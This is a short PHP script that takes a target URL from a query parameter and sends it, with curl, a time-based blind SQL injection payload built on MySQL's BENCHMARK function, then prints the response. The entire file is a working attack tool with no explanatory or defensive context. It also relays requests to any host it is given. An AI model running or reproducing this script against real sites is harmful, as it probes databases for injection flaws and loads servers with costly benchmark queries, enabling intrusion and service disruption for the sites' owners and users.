<?
$host = $_GET['host'];
if( $curl = curl_init() ) {
    curl_setopt($curl, CURLOPT_URL, $host." and(select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))");
    curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
    $out = curl_exec($curl);
    echo $out;
    curl_close($curl);
}
?>
